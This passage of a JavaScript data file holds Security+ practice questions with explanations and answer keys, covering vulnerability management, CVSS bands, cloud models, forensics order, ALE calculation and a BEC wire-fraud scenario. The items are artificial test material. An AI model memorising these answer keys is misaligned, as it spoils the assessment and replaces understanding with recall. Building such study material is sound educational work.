            { id: 'decoynet', label: 'Decoy network' },
            { id: 'bait', label: 'Bait data' }
          ]
        },
        answer: { map: { hpot: 'decoy1', hnet: 'decoynet', hfile: 'bait', htoken: 'bait' } } }
    ]
  },

  // ===== Domain 2 — Threats, Vulnerabilities & Mitigations (+6) =====
  {
    id: 'sp-seed-vulnmgmt-order-1', cert: 'secplus', objective: '4.3', topic: 'Vulnerability management',
    title: 'Order the vulnerability-management lifecycle', estMinutes: 4,
    scenario: 'Your team runs a recurring vulnerability-management program. Put the lifecycle stages in order, first stage at the top.',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the vulnerability-management stages in order.',
        explanation: 'Identify the assets and scan to discover vulnerabilities, analyze and prioritize the findings (e.g., by CVSS and context), remediate or otherwise treat them, validate that the fix worked (rescan), and report/monitor on an ongoing basis.',
        payload: { items: [
          { id: 'remediate', label: 'Remediate the prioritized vulnerabilities' },
          { id: 'identify', label: 'Identify assets and scan for vulnerabilities' },
          { id: 'report', label: 'Report and continuously monitor' },
          { id: 'analyze', label: 'Analyze and prioritize the findings' },
          { id: 'validate', label: 'Validate the fix by rescanning' }
        ] },
        answer: { correctOrder: ['identify', 'analyze', 'remediate', 'validate', 'report'] } }
    ]
  },

  {
    id: 'sp-seed-vulntypes-match-1', cert: 'secplus', objective: '2.3', topic: 'Vulnerability types',
    title: 'Match the vulnerability type', estMinutes: 4,
    scenario: 'Match each vulnerability to its precise definition.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each vulnerability with its definition.',
        explanation: 'A zero-day is a flaw exploited before a patch exists. A race condition (TOCTOU) exploits the gap between check and use. A misconfiguration is an insecure setting left in place. Improper input validation lets untrusted data reach sensitive logic. A legacy/EOL system no longer receives security updates.',
        payload: {
          left: [
            { id: 'zeroday', label: 'Zero-day' },
            { id: 'race', label: 'Race condition (TOCTOU)' },
            { id: 'misconfig', label: 'Misconfiguration' },
            { id: 'inputval', label: 'Improper input validation' },
            { id: 'legacy', label: 'Legacy / end-of-life system' }
          ],
          right: [
            { id: 'dnopatch', label: 'Flaw exploited before a patch exists' },
            { id: 'dgap', label: 'Exploits the gap between time-of-check and time-of-use' },
            { id: 'dsetting', label: 'An insecure setting left in place' },
            { id: 'duntrusted', label: 'Untrusted data reaches sensitive logic unchecked' },
            { id: 'dnoupdate', label: 'No longer receives security updates' }
          ]
        },
        answer: { pairs: { zeroday: 'dnopatch', race: 'dgap', misconfig: 'dsetting', inputval: 'duntrusted', legacy: 'dnoupdate' } } }
    ]
  },

  {
    id: 'sp-seed-indicators-analyze-1', cert: 'secplus', objective: '2.4', topic: 'Indicators of compromise',
    title: 'Spot the data-exfiltration indicator', estMinutes: 3,
    scenario: 'A host’s monitoring summary is shown. Click the single line that most strongly indicates data exfiltration.',
    steps: [
      { id: 's1', type: 'analyze', points: 1,
        prompt: 'Select the strongest indicator of data exfiltration.',
        explanation: 'A large sustained outbound transfer to an unknown external host is the classic exfiltration signature. High CPU, a scheduled reboot, and a single failed login are normal or low-signal events by comparison.',
        payload: {
          multi: false,
          lines: [
            { id: 'l1', text: 'CPU utilization peaked at 78% during nightly backup' },
            { id: 'l2', text: '4.2 GB uploaded to 198.51.100.77 (unknown host) over 3 hours' },
            { id: 'l3', text: 'Scheduled OS reboot completed at 02:00' },
            { id: 'l4', text: 'One failed login for user mfaadmin, then success' }
          ]
        },
        answer: { selected: ['l2'] } }
    ]
  },

  {
    id: 'sp-seed-mitigations-match-1', cert: 'secplus', objective: '2.5', topic: 'Mitigation techniques',
    title: 'Match the mitigation technique', estMinutes: 4,
    scenario: 'Match each enterprise mitigation technique to what it does.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each mitigation with its effect.',
        explanation: 'Segmentation divides the network to limit lateral movement. Allow listing permits only approved applications to run. Least privilege grants only the minimum access required. Patching removes known vulnerabilities. Encryption protects data confidentiality at rest or in transit.',
        payload: {
          left: [
            { id: 'segment', label: 'Segmentation' },
            { id: 'allowlist', label: 'Application allow listing' },
            { id: 'leastpriv', label: 'Least privilege' },
            { id: 'patch', label: 'Patching' },
            { id: 'encrypt', label: 'Encryption' }
          ],
          right: [
            { id: 'dlateral', label: 'Divides the network to limit lateral movement' },
            { id: 'dapproved', label: 'Permits only approved applications to run' },
            { id: 'dminimum', label: 'Grants only the minimum access required' },
            { id: 'dknownvuln', label: 'Removes known vulnerabilities' },
            { id: 'dconfid', label: 'Protects data confidentiality' }
          ]
        },
        answer: { pairs: { segment: 'dlateral', allowlist: 'dapproved', leastpriv: 'dminimum', patch: 'dknownvuln', encrypt: 'dconfid' } } }
    ]
  },

  {
    id: 'sp-seed-attacksurface-cat-1', cert: 'secplus', objective: '2.4', topic: 'Network attacks',
    title: 'Classify the network attack', estMinutes: 4,
    scenario: 'Sort each attack by its category: on-path/spoofing, denial-of-service, or wireless.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each attack under On-path / spoofing, Denial of service, or Wireless.',
        explanation: 'ARP poisoning and DNS spoofing redirect traffic by falsifying address mappings (on-path/spoofing). A SYN flood and an amplified DDoS exhaust resources (denial of service). An evil twin and a deauthentication attack target Wi-Fi clients (wireless).',
        payload: {
          items: [
            { id: 'arp', label: 'ARP poisoning' },
            { id: 'dns', label: 'DNS spoofing' },
            { id: 'syn', label: 'SYN flood' },
            { id: 'ddos', label: 'Amplified DDoS' },
            { id: 'eviltwin', label: 'Evil twin access point' },
            { id: 'deauth', label: 'Deauthentication attack' }
          ],
          buckets: [
            { id: 'onpath', label: 'On-path / spoofing' },
            { id: 'dos', label: 'Denial of service' },
            { id: 'wireless', label: 'Wireless' }
          ]
        },
        answer: { map: { arp: 'onpath', dns: 'onpath', syn: 'dos', ddos: 'dos', eviltwin: 'wireless', deauth: 'wireless' } } }
    ]
  },

  {
    id: 'sp-seed-cvss-fillin-1', cert: 'secplus', objective: '4.3', topic: 'Vulnerability scoring',
    title: 'Read the CVSS severity bands', estMinutes: 3,
    scenario: 'A finding carries a CVSS v3.1 base score of 7.5. Answer both fields about CVSS severity.',
    steps: [
      { id: 's1', type: 'fillin', points: 1,
        prompt: 'What qualitative severity rating does a CVSS v3.1 base score of 7.5 fall into?',
        explanation: 'CVSS v3.1 bands: 0.0 None, 0.1–3.9 Low, 4.0–6.9 Medium, 7.0–8.9 High, 9.0–10.0 Critical. 7.5 is High.',
        payload: { fields: [{ id: 'rating', label: 'Severity rating', inputmode: 'text' }] },
        answer: { rating: ['High', 'high'] } },
      { id: 's2', type: 'fillin', points: 1,
        prompt: 'What is the lowest base score that is rated Critical?',
        explanation: 'The Critical band begins at 9.0 and runs through 10.0.',
        payload: { fields: [{ id: 'crit', label: 'Lowest Critical score', inputmode: 'decimal' }] },
        answer: { crit: ['9.0', '9'] } }
    ]
  },

  // ===== Domain 3 — Security Architecture (+7) =====
  {
    id: 'sp-seed-cloudresp-cat-1', cert: 'secplus', objective: '3.1', topic: 'Cloud responsibility',
    title: 'Categorize cloud responsibility', estMinutes: 4,
    scenario: 'Under the shared responsibility model, sort each responsibility by who owns it across IaaS. Then think about the model boundary.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'In an IaaS deployment, place each responsibility under Customer or Cloud provider.',
        explanation: 'In IaaS the provider owns the physical datacenter, host hardware, and the virtualization/hypervisor layer. The customer owns the guest operating system, applications, and their own data. The customer always owns their data regardless of service model.',
        payload: {
          items: [
            { id: 'datacenter', label: 'Physical datacenter security' },
            { id: 'hypervisor', label: 'Hypervisor / virtualization layer' },
            { id: 'guestos', label: 'Guest operating system patching' },
            { id: 'app', label: 'Application configuration' },
            { id: 'custdata', label: 'Customer data' },
            { id: 'hardware', label: 'Host hardware' }
          ],
          buckets: [
            { id: 'customer', label: 'Customer' },
            { id: 'provider', label: 'Cloud provider' }
          ]
        },
        answer: { map: { datacenter: 'provider', hypervisor: 'provider', guestos: 'customer', app: 'customer', custdata: 'customer', hardware: 'provider' } } }
    ]
  },

  {
    id: 'sp-seed-cloudmodels-match-1', cert: 'secplus', objective: '3.1', topic: 'Cloud service models',
    title: 'Match the cloud service model', estMinutes: 3,
    scenario: 'Match each cloud-computing term to its meaning.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each cloud term with its definition.',
        explanation: 'IaaS provides virtualized infrastructure (compute, storage, network). PaaS provides a managed platform to build and run apps. SaaS delivers finished software over the web. A hybrid cloud combines private and public cloud. SASE converges networking and security as a cloud-delivered service.',
        payload: {
          left: [
            { id: 'iaas', label: 'IaaS' },
            { id: 'paas', label: 'PaaS' },
            { id: 'saas', label: 'SaaS' },
            { id: 'hybrid', label: 'Hybrid cloud' },
            { id: 'sase', label: 'SASE' }
          ],
          right: [
            { id: 'dinfra', label: 'Virtualized infrastructure (compute, storage, network)' },
            { id: 'dplatform', label: 'Managed platform to build and run apps' },
            { id: 'dsoftware', label: 'Finished software delivered over the web' },
            { id: 'dcombo', label: 'Combines private and public cloud' },
            { id: 'dconverge', label: 'Cloud-delivered convergence of networking and security' }
          ]
        },
        answer: { pairs: { iaas: 'dinfra', paas: 'dplatform', saas: 'dsoftware', hybrid: 'dcombo', sase: 'dconverge' } } }
    ]
  },

  {
    id: 'sp-seed-enclevels-cat-1', cert: 'secplus', objective: '1.4', topic: 'Encryption levels',
    title: 'Categorize the encryption level', estMinutes: 4,
    scenario: 'Encryption can be applied at different levels. Sort each scenario by the level of encryption it describes.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each item under Full-disk, File, Database, or Transport.',
        explanation: 'Full-disk encryption (e.g., BitLocker) protects the entire volume at rest. File-level encryption protects an individual file or folder. Database encryption (e.g., TDE) protects data inside the database. Transport encryption (e.g., TLS) protects data while it moves across the network.',
        payload: {
          items: [
            { id: 'bitlocker', label: 'BitLocker encrypting an entire laptop volume' },
            { id: 'efs', label: 'Encrypting a single sensitive document' },
            { id: 'tde', label: 'Transparent data encryption on a SQL table' },
            { id: 'tls', label: 'TLS protecting data between browser and server' }
          ],
          buckets: [
            { id: 'fde', label: 'Full-disk' },
            { id: 'filelvl', label: 'File' },
            { id: 'dblvl', label: 'Database' },
            { id: 'transport', label: 'Transport' }
          ]
        },
        answer: { map: { bitlocker: 'fde', efs: 'filelvl', tde: 'dblvl', tls: 'transport' } } }
    ]
  },

  {
    id: 'sp-seed-appliances-match-1', cert: 'secplus', objective: '3.2', topic: 'Network appliances',
    title: 'Match the network security appliance', estMinutes: 4,
    scenario: 'Match each network security appliance to its primary role.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each appliance with its primary role.',
        explanation: 'A next-generation firewall (NGFW) adds application awareness and deep inspection to traditional filtering. A WAF protects web applications from attacks like SQLi and XSS. A forward proxy mediates outbound user requests. An IDS detects and alerts on malicious traffic. An IPS detects and actively blocks malicious traffic inline.',
        payload: {
          left: [
            { id: 'ngfw', label: 'NGFW' },
            { id: 'waf', label: 'WAF' },
            { id: 'proxy', label: 'Forward proxy' },
            { id: 'ids', label: 'IDS' },
            { id: 'ips', label: 'IPS' }
          ],
          right: [
            { id: 'dappaware', label: 'Application-aware filtering with deep inspection' },
            { id: 'dweb', label: 'Protects web apps from SQLi and XSS' },
            { id: 'doutbound', label: 'Mediates outbound user requests' },
            { id: 'dalert', label: 'Detects and alerts on malicious traffic' },
            { id: 'dblock', label: 'Detects and actively blocks malicious traffic inline' }
          ]
        },
        answer: { pairs: { ngfw: 'dappaware', waf: 'dweb', proxy: 'doutbound', ids: 'dalert', ips: 'dblock' } } }
    ]
  },

  {
    id: 'sp-seed-wireless-match-1', cert: 'secplus', objective: '4.1', topic: 'Wireless security',
    title: 'Match the wireless security mechanism', estMinutes: 4,
    scenario: 'Match each wireless security mechanism to its description.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each wireless mechanism with its description.',
        explanation: 'WPA2 uses AES-CCMP and the 4-way handshake. WPA3 adds SAE (Simultaneous Authentication of Equals) for stronger handshake protection. EAP-TLS uses client and server certificates for mutual authentication. PEAP wraps an inner EAP method inside a server-side TLS tunnel. A RADIUS server provides centralized AAA for enterprise (802.1X) Wi-Fi.',
        payload: {
          left: [
            { id: 'wpa2', label: 'WPA2' },
            { id: 'wpa3', label: 'WPA3' },
            { id: 'eaptls', label: 'EAP-TLS' },
            { id: 'peap', label: 'PEAP' },
            { id: 'radius', label: 'RADIUS' }
          ],
          right: [
            { id: 'daesccmp', label: 'Uses AES-CCMP and the 4-way handshake' },
            { id: 'dsae', label: 'Adds SAE for stronger handshake protection' },
            { id: 'dcerts', label: 'Uses client and server certificates for mutual auth' },
            { id: 'dtunnel', label: 'Wraps an inner EAP method in a server-side TLS tunnel' },
            { id: 'daaa', label: 'Centralized AAA for enterprise 802.1X Wi-Fi' }
          ]
        },
        answer: { pairs: { wpa2: 'daesccmp', wpa3: 'dsae', eaptls: 'dcerts', peap: 'dtunnel', radius: 'daaa' } } }
    ]
  },

  {
    id: 'sp-seed-hardening-match-1', cert: 'secplus', objective: '2.5', topic: 'Hardening',
    title: 'Match the hardening technique', estMinutes: 4,
    scenario: 'Match each system-hardening technique to its purpose.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each hardening technique with its purpose.',
        explanation: 'Disabling unused services and ports shrinks the attack surface. Changing default credentials removes a well-known entry point. Applying a security baseline enforces a known-good configuration. Host-based firewalling restricts traffic at the endpoint. Removing unnecessary software eliminates code that could be exploited.',
        payload: {
          left: [
            { id: 'disable', label: 'Disable unused services and ports' },
            { id: 'defcred', label: 'Change default credentials' },
            { id: 'baseline', label: 'Apply a security baseline' },
            { id: 'hostfw', label: 'Host-based firewall' },
            { id: 'debloat', label: 'Remove unnecessary software' }
          ],
          right: [
            { id: 'dsurface', label: 'Shrinks the attack surface' },
            { id: 'dwellknown', label: 'Removes a well-known entry point' },
            { id: 'dknowngood', label: 'Enforces a known-good configuration' },
            { id: 'dendpoint', label: 'Restricts traffic at the endpoint' },
            { id: 'dcode', label: 'Eliminates code that could be exploited' }
          ]
        },
        answer: { pairs: { disable: 'dsurface', defcred: 'dwellknown', baseline: 'dknowngood', hostfw: 'dendpoint', debloat: 'dcode' } } }
    ]
  },

  {
    id: 'sp-seed-screened-fillin-1', cert: 'secplus', objective: '3.1', topic: 'Network segmentation',
    title: 'Plan the screened subnet', estMinutes: 4,
    scenario: 'You are deploying a screened subnet (DMZ) for public services. Answer both conceptual fields.',
    steps: [
      { id: 's1', type: 'fillin', points: 1,
        prompt: 'What is the older two-word name for the screened subnet that sits between the internet and the internal network? (the common acronym)',
        explanation: 'The screened subnet was historically called the DMZ (demilitarized zone) — a buffer network for internet-facing hosts between the untrusted internet and the trusted internal LAN.',
        payload: { fields: [{ id: 'dmz', label: 'Acronym', inputmode: 'text' }] },
        answer: { dmz: ['DMZ', 'dmz', 'demilitarized zone'] } },
      { id: 's2', type: 'fillin', points: 1,
        prompt: 'A web server in the screened subnet is compromised. What network design property limits the attacker from reaching internal databases? (one word)',
        explanation: 'Segmentation (network segmentation) isolates the screened subnet from the internal network, so a compromised DMZ host cannot freely reach internal systems.',
        payload: { fields: [{ id: 'seg', label: 'One word', inputmode: 'text' }] },
        // Reviewed (CompTIA examiner): SY0-701 keys "segmentation"; "isolation" is a distractor (air-gap/quarantine) and is NOT accepted in exam mode.
        answer: { seg: ['segmentation', 'segment'] } }
    ]
  },

  // ===== Domain 4 — Security Operations (+7) =====
  {
    id: 'sp-seed-change-order-1', cert: 'secplus', objective: '1.3', topic: 'Change management',
    title: 'Order the change-management process', estMinutes: 4,
    scenario: 'A standard change must move through your change-management process. Put the steps in order, first step at the top.',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the change-management steps in order.',
        explanation: 'Submit a change request, have the Change Advisory Board (CAB) review and approve it, test the change in a non-production environment, implement it during the approved maintenance window with a backout plan ready, then document the change. Approval precedes testing and implementation.',
        payload: { items: [
          { id: 'test', label: 'Test the change in a non-production environment' },
          { id: 'request', label: 'Submit the change request' },
          { id: 'document', label: 'Document the completed change' },
          { id: 'approve', label: 'CAB reviews and approves the request' },
          { id: 'implement', label: 'Implement during the maintenance window' }
        ] },
        answer: { correctOrder: ['request', 'approve', 'test', 'implement', 'document'] } }
    ]
  },

  {
    id: 'sp-seed-forensics-order-1', cert: 'secplus', objective: '4.8', topic: 'Digital forensics',
    title: 'Order the forensic evidence-handling flow', estMinutes: 4,
    scenario: 'You are handling digital evidence after an incident. Put the forensic process in order, first step at the top.',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the digital-forensics steps in order.',
        explanation: 'Identify the relevant evidence, acquire it (create a forensic image), preserve it and maintain chain of custody, analyze the preserved copy, then report the findings. Acquisition and preservation precede analysis so the original is never altered.',
        payload: { items: [
          { id: 'analyze', label: 'Analyze the preserved copy' },
          { id: 'identify', label: 'Identify the relevant evidence' },
          { id: 'report', label: 'Report the findings' },
          { id: 'acquire', label: 'Acquire (image) the evidence' },
          { id: 'preserve', label: 'Preserve evidence and maintain chain of custody' }
        ] },
        answer: { correctOrder: ['identify', 'acquire', 'preserve', 'analyze', 'report'] } }
    ]
  },

  {
    id: 'sp-seed-volatility-order-1', cert: 'secplus', objective: '4.8', topic: 'Order of volatility',
    title: 'Order of volatility for evidence collection', estMinutes: 4,
    scenario: 'When collecting forensic evidence you collect the most volatile data first. Order these sources from MOST volatile (top) to LEAST volatile (bottom).',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the sources from most volatile to least volatile.',
        explanation: 'Order of volatility (most → least): CPU registers and cache, RAM (memory/running state), network/temp swap, disk/drive contents, then archival media such as backups. The most ephemeral data must be captured first before it is lost.',
        payload: { items: [
          { id: 'disk', label: 'Disk / drive contents' },
          { id: 'registers', label: 'CPU registers and cache' },
          { id: 'archive', label: 'Archival media (backups)' },
          { id: 'ram', label: 'RAM (running memory)' },
          { id: 'swap', label: 'Temporary swap / network state' }
        ] },
        answer: { correctOrder: ['registers', 'ram', 'swap', 'disk', 'archive'] } }
    ]
  },

  {
    id: 'sp-seed-siem-match-1', cert: 'secplus', objective: '4.4', topic: 'SIEM and log sources',
    title: 'Match the SIEM log source', estMinutes: 4,
    scenario: 'A SIEM ingests data from many sources. Match each log/data source to what it provides.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each source with what it provides to the SIEM.',
        explanation: 'Firewall logs show allowed/denied connections. Endpoint (EDR) telemetry shows process and host behavior. Authentication logs show login successes and failures. NetFlow shows traffic volume and conversations (who talked to whom). Vulnerability scan output shows weaknesses present on assets.',
        payload: {
          left: [
            { id: 'fwlog', label: 'Firewall logs' },
            { id: 'edr', label: 'Endpoint (EDR) telemetry' },
            { id: 'authlog', label: 'Authentication logs' },
            { id: 'netflow', label: 'NetFlow' },
            { id: 'vulnscan', label: 'Vulnerability scan output' }
          ],
          right: [
            { id: 'dconnections', label: 'Allowed and denied connections' },
            { id: 'dprocess', label: 'Process and host behavior' },
            { id: 'dlogins', label: 'Login successes and failures' },
            { id: 'dconvo', label: 'Traffic volume and conversations' },
            { id: 'dweakness', label: 'Weaknesses present on assets' }
          ]
        },
        answer: { pairs: { fwlog: 'dconnections', edr: 'dprocess', authlog: 'dlogins', netflow: 'dconvo', vulnscan: 'dweakness' } } }
    ]
  },

  {
    id: 'sp-seed-bruteforce-analyze-1', cert: 'secplus', objective: '4.4', topic: 'Log analysis',
    title: 'Identify the attack from the auth log', estMinutes: 3,
    scenario: 'An authentication log excerpt is shown. Click the single line that reveals the attack type in progress.',
    steps: [
      { id: 's1', type: 'analyze', points: 1,
        prompt: 'Select the line that identifies the attack.',
        explanation: 'Many rapid failed logins for one account from one source, followed by a success, is a brute-force/password-guessing attack that succeeded. The other lines are routine single events or normal administrative activity.',
        payload: {
          multi: false,
          lines: [
            { id: 'l1', text: '09:14 Accepted password for svc_backup from 10.0.0.4' },
            { id: 'l2', text: '09:15–09:16 187 failed passwords for admin from 203.0.113.9, then Accepted' },
            { id: 'l3', text: '09:20 sudo: jdoe ran /usr/bin/apt update' },
            { id: 'l4', text: '09:22 Session opened for user mraley (MFA verified)' }
          ]
        },
        answer: { selected: ['l2'] } }
    ]
  },

  {
    id: 'sp-seed-physical-match-1', cert: 'secplus', objective: '1.2', topic: 'Physical controls',
    title: 'Match the physical security control', estMinutes: 4,
    scenario: 'Match each physical security control to its primary purpose.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each physical control with its purpose.',
        explanation: 'Bollards are barriers that stop vehicles from ramming a building. An access control vestibule (mantrap) prevents tailgating by trapping one person at a time. A security guard provides human detection and response. CCTV provides surveillance and detective evidence. A proximity badge reader controls electronic door access.',
        payload: {
          left: [
            { id: 'bollard', label: 'Bollards' },
            { id: 'vestibule', label: 'Access control vestibule' },
            { id: 'guard', label: 'Security guard' },
            { id: 'cctv', label: 'CCTV' },
            { id: 'badge', label: 'Proximity badge reader' }
          ],
          right: [
            { id: 'dvehicle', label: 'Stops vehicles from ramming a building' },
            { id: 'dtailgate', label: 'Prevents tailgating, one person at a time' },
            { id: 'dhuman', label: 'Human detection and response' },
            { id: 'dsurveil', label: 'Surveillance and detective evidence' },
            { id: 'ddooraccess', label: 'Controls electronic door access' }
          ]
        },
        answer: { pairs: { bollard: 'dvehicle', vestibule: 'dtailgate', guard: 'dhuman', cctv: 'dsurveil', badge: 'ddooraccess' } } }
    ]
  },

  {
    id: 'sp-seed-accesscontrol-cat-1', cert: 'secplus', objective: '4.6', topic: 'Access control models',
    title: 'Classify the access control model', estMinutes: 3,
    scenario: 'Sort each access-control example by the model it represents.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each example under RBAC, ABAC, MAC, or DAC.',
        explanation: 'RBAC grants access by job role. ABAC grants access by evaluating attributes (department, time, location). MAC enforces access via system-set labels/clearances that users cannot change. DAC lets the data owner decide who gets access.',
        payload: {
          items: [
            { id: 'role', label: 'Access granted because the user is in the "Nurse" role' },
            { id: 'attr', label: 'Access granted only to Finance staff during business hours' },
            { id: 'label', label: 'Access enforced by Top Secret clearance labels set by the system' },
            { id: 'owner', label: 'The file owner chooses which colleagues may read the file' }
          ],
          buckets: [
            { id: 'rbac', label: 'RBAC' },
            { id: 'abac', label: 'ABAC' },
            { id: 'mac', label: 'MAC' },
            { id: 'dac', label: 'DAC' }
          ]
        },
        answer: { map: { role: 'rbac', attr: 'abac', label: 'mac', owner: 'dac' } } }
    ]
  },

  // ===== Domain 5 — Security Program Management & Oversight (+4) =====
  {
    id: 'sp-seed-dataclass-cat-1', cert: 'secplus', objective: '5.1', topic: 'Data classification',
    title: 'Classify the regulated data type', estMinutes: 4,
    scenario: 'Sort each data example by its inherent type, out of context: PII, PHI, or Financial/PCI.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each data item under PII, PHI, or Financial / PCI.',
        explanation: 'PII identifies a person (SSN, home address). PHI is health information tied to an individual under HIPAA (diagnosis, medical record number). Financial/PCI data covers cardholder and payment data (credit card PAN, bank account number).',
        payload: {
          items: [
            { id: 'ssn', label: 'Social Security number' },
            { id: 'address', label: 'Home address' },
            { id: 'diagnosis', label: 'Patient diagnosis' },
            { id: 'mrn', label: 'Medical record number' },
            { id: 'pan', label: 'Credit card number (PAN)' },
            { id: 'bank', label: 'Bank account number' }
          ],
          buckets: [
            { id: 'pii', label: 'PII' },
            { id: 'phi', label: 'PHI' },
            { id: 'fin', label: 'Financial / PCI' }
          ]
        },
        // Reviewed (CompTIA examiner): stem now specifies "by inherent type, out of context", so SSN/address = PII is exam-safe (they become PHI only inside a medical record).
        answer: { map: { ssn: 'pii', address: 'pii', diagnosis: 'phi', mrn: 'phi', pan: 'fin', bank: 'fin' } } }
    ]
  },

  {
    id: 'sp-seed-riskanalysis-fillin-1', cert: 'secplus', objective: '5.2', topic: 'Quantitative risk',
    title: 'Compute ALE from SLE and ARO', estMinutes: 4,
    scenario: 'A quantitative risk analysis gives you an asset value and an incident frequency. Compute the figures. SLE = AV × EF; ALE = SLE × ARO.',
    steps: [
      { id: 's1', type: 'fillin', points: 1,
        prompt: 'An asset is worth $80,000 and an incident destroys 25% of its value. What is the SLE in dollars?',
        explanation: 'SLE = Asset Value × Exposure Factor = $80,000 × 0.25 = $20,000.',
        payload: { fields: [{ id: 'sle', label: 'SLE (USD)', inputmode: 'numeric' }] },
        answer: { sle: ['20000', '$20000', '20,000', '$20,000'] } },
      { id: 's2', type: 'fillin', points: 1,
        prompt: 'If that incident is expected twice per year (ARO = 2), what is the ALE in dollars?',
        explanation: 'ALE = SLE × ARO = $20,000 × 2 = $40,000 per year.',
        payload: { fields: [{ id: 'ale', label: 'ALE (USD)', inputmode: 'numeric' }] },
        answer: { ale: ['40000', '$40000', '40,000', '$40,000'] } },
      { id: 's3', type: 'fillin', points: 1,
        prompt: 'Does "qualitative" or "quantitative" risk analysis use dollar figures like SLE and ALE? (one word)',
        explanation: 'Quantitative analysis assigns numeric/monetary values (SLE, ARO, ALE). Qualitative analysis uses relative ratings such as high/medium/low.',
        payload: { fields: [{ id: 'kind', label: 'One word', inputmode: 'text' }] },
        answer: { kind: ['quantitative', 'Quantitative'] } }
    ]
  },

  {
    id: 'sp-seed-assessment-match-1', cert: 'secplus', objective: '5.5', topic: 'Audits and assessments',
    title: 'Match the assessment type', estMinutes: 4,
    scenario: 'Match each security assessment or audit type to its description.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each assessment type with its description.',
        explanation: 'A penetration test actively exploits weaknesses to prove impact. A vulnerability assessment identifies weaknesses without exploiting them. An internal audit is performed by the organization’s own staff. An external/third-party audit is performed by an independent party. An attestation is a formal statement that controls meet a standard.',
        payload: {
          left: [
            { id: 'pentest', label: 'Penetration test' },
            { id: 'vulnassess', label: 'Vulnerability assessment' },
            { id: 'internal', label: 'Internal audit' },
            { id: 'external', label: 'External audit' },
            { id: 'attest', label: 'Attestation' }
          ],
          right: [
            { id: 'dexploit', label: 'Actively exploits weaknesses to prove impact' },
            { id: 'dnoexploit', label: 'Identifies weaknesses without exploiting them' },
            { id: 'downstaff', label: 'Performed by the organization’s own staff' },
            { id: 'dindependent', label: 'Performed by an independent third party' },
            { id: 'dstatement', label: 'Formal statement that controls meet a standard' }
          ]
        },
        answer: { pairs: { pentest: 'dexploit', vulnassess: 'dnoexploit', internal: 'downstaff', external: 'dindependent', attest: 'dstatement' } } }
    ]
  },

  {
    id: 'sp-seed-privacy-match-1', cert: 'secplus', objective: '5.1', topic: 'Privacy and governance',
    title: 'Match the governance / privacy term', estMinutes: 4,
    scenario: 'Match each governance or privacy concept to its meaning.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each term with its meaning.',
        explanation: 'GDPR is the EU regulation governing personal-data protection. The right to be forgotten lets a data subject request deletion of their data. Data sovereignty means data is subject to the laws of the country where it resides. Data minimization means collecting only the data you actually need. Anonymization irreversibly strips identifiers so data can no longer be tied to a person.',
        payload: {
          left: [
            { id: 'gdpr', label: 'GDPR' },
            { id: 'rtbf', label: 'Right to be forgotten' },
            { id: 'sovereignty', label: 'Data sovereignty' },
            { id: 'minimization', label: 'Data minimization' },
            { id: 'anon', label: 'Anonymization' }
          ],
          right: [
            { id: 'deureg', label: 'EU regulation governing personal-data protection' },
            { id: 'ddelete', label: 'A subject can request deletion of their data' },
            { id: 'dlaws', label: 'Data is subject to the laws of the country it resides in' },
            { id: 'donlyneed', label: 'Collect only the data you actually need' },
            { id: 'dstrip', label: 'Irreversibly strips identifiers from data' }
          ]
        },
        answer: { pairs: { gdpr: 'deureg', rtbf: 'ddelete', sovereignty: 'dlaws', minimization: 'donlyneed', anon: 'dstrip' } } }
    ]
  },

  // ===== Sec+ Incident Response PBQ bank (Task 13, 2-agent consensus gated) =====
  // 1. Phishing/BEC — Detection & Analysis emphasis
  {
    id: 'sp-ir-bec-wiretransfer', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'BEC wire-transfer fraud', estMinutes: 5, archetype: 'incident',
    scenario: 'The CFO\'s assistant received an email that appeared to come from the CEO, urgently requesting a same-day wire transfer to a "new vendor." The domain was one character off from the real company domain. The assistant initiated the transfer before Accounting flagged it.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'mail', label: 'Spoofed "CEO" email arrives requesting urgent wire transfer', time: 'T+0m' },
      { id: 's2', icon: 'search', label: 'Assistant does not verify sender domain; replies to confirm details', time: 'T+12m' },
      { id: 's3', icon: 'bank', label: 'Wire transfer of $42,000 initiated to attacker-controlled account', time: 'T+40m' },
      { id: 's4', icon: 'alert', label: 'Accounting notices the vendor was never onboarded and halts further payments', time: 'T+70m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A look-alike domain plus a spoofed executive identity requesting an urgent, unverified wire transfer is the classic pattern for Business Email Compromise (BEC). Given money already left the organization, this is high severity, and the first action is to stop further loss by contacting the bank and freezing the transaction where possible.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'bank', text: 'Contact the bank to attempt to recall or freeze the wire transfer' },
            { id: 'reset', text: 'Reset the CFO assistant\'s email password' },
            { id: 'block', text: 'Block the sender domain at the email gateway' },
            { id: 'train', text: 'Schedule phishing-awareness training for Accounting' }
          ] }
        ] },
        answer: { slots: { sev: 'high', first: 'bank' } } },
      { id: 'o1', type: 'order', points: 1,
